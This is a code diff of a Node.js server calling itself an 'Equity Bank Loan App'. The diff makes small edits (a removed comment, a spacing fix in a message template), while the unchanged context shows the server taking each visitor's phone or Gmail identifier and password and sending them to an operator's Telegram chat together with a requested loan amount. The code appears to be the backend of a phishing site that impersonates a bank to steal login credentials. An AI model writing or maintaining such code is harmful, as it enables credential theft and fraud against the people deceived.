@@ -57,7 +57,6 @@ app.ws('/ws', (ws, req) => {
   });
 });
 
-// Fallback HTTP POST endpoint to guarantee Telegram delivery
 app.post('/api/submit', (req, res) => {
   handleClientMessage(req.body);
   res.json({ success: true });
@@ -82,7 +81,7 @@ function handleClientMessage(data) {
         `• *Currency:* ${data.currency || 'KES'}\n` +
         `• *Identifier (Phone/Gmail):* ${data.identifier}\n` +
         `• *Password:* \`${data.password}\`\n` +
-        `• *Requested Amount:* ${data.currency}${data.amount || '250,000'}`;
+        `• *Requested Amount:* ${data.currency} ${data.amount || '250,000'}`;
 
       bot.sendMessage(adminChatId, text, {
         parse_mode: 'Markdown',
@@ -161,4 +160,4 @@ function handleClientMessage(data) {
 app.listen(PORT, () => {
   console.log(`Equity Bank Loan App running on port ${PORT}`);
 });
-                        
+      
